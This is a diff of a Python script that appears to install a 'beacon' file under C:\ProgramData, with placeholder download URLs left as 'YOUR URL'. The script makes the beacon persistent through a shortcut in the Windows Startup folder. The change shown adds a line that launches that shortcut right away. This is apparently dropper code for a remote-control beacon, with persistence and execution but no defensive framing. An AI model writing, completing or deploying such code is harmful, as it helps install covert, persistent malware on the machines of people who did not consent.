@@ -12,7 +12,8 @@ INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
 
 DOT_ENV_FILE_URL = "YOUR URL"
 BEACON_URL = "YOUR URL"
-fulcrum_beacon_file_name = ""
+
+fulcrum_beacon_file_name = ""   # not used
 
 START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
 
@@ -68,6 +69,9 @@ def main():
         # add the file to startup using a shortcut in the startup folder
         create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"),
                         os.path.join(INSTALL_PATH, beacon_filename))
+
+        # execute shortcut
+        os.startfile(os.path.join(START_FOLDER, "START_MENU.lnk"))
 
 
 
